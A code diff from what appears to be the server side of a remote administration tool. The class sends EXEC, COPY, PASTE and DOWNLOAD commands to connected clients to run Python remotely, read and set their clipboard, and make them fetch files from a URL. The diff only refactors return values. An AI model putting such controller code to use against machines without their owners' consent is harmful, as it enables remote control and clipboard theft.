@@ -405,8 +405,7 @@ class MultiServer(object):
         """ Remote Python Interpreter """
         # returns command_output, error/None
         self.send(conn, json_dumps(['EXEC', command]))
-        data = json_loads(self.receive(conn))
-        return data[0], data[1]
+        return tuple(json_loads(self.receive(conn)))
 
     def python_interpreter(self, conn) -> None:
         """ Remote Python Interpreter CLI"""
@@ -521,18 +520,14 @@ class MultiServer(object):
         # data[0]: True/False
         # data[1]: None/error
         self.send(conn, json_dumps(['COPY', data]))
-        data = json_loads(self.receive(conn))
-        return data[0], data[1]
+        return tuple(json_loads(self.receive(conn)))
 
-    def get_clipboard(self, conn, _print=False) -> (bool, str):
+    def get_clipboard(self, conn) -> (bool, str):
         """ Get Client Clipboard """
         # data[0]: True/False
         # data[1]: clipboard/error
         self.send(conn, json_dumps(['PASTE']))
-        data = json_loads(self.receive(conn))
-        if _print and data[0]:
-            print(data[1])
-        return data[0], data[1]
+        return tuple(json_loads(self.receive(conn)))
 
     def _get_info(self, conn) -> list:
         """ Get Client Info """
@@ -550,8 +545,7 @@ class MultiServer(object):
         """ Download File To Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['DOWNLOAD', url, file_name]))
-        data = json_loads(self.receive(conn))
-        return data[0], data[1]
+        return tuple(json_loads(self.receive(conn)))
 
     def restart_session(self, conn) -> bool:
         """ Restart Client Session """
@@ -716,7 +710,8 @@ class MultiServer(object):
                 print(error)
             return
         if '--p' in command:
-            self.get_clipboard(conn, _print=True)
+            _, output = self.get_clipboard(conn)
+            print(output)
             return
         if command [:3] == '--t':
             select = command[4:].strip().lower()
